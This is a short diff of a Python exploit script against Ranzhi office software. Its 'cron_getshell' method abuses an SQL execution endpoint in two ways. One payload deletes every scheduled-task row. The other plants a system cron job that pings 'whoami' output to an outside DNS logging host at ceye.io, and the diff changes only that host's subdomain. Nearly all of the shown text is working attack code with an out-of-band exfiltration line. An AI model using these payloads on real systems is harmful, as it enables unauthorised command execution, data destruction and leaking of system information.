@@ -92,7 +92,7 @@ class Login_ranzhi():
             print "getshell fail"
     def cron_getshell(self):
         exp(self.ip_addr,"sql=delete from sys_cron where id=1 or 1=1")
-        exp(self.ip_addr,"sql=INSERT INTO sys_cron(m,h,dom,mon,dow,command,remark,type)values('*','*','*','*','*','ping `whoami`.e7coo8.ceye.io','123','system')")
+        exp(self.ip_addr,"sql=INSERT INTO sys_cron(m,h,dom,mon,dow,command,remark,type)values('*','*','*','*','*','ping `whoami`.ceye.io','123','system')")
         eq_head = {'X-Requested-With': 'XMLHttpRequest'}
         self.s.headers=eq_head
         self.s.get(url=self.url_cron)
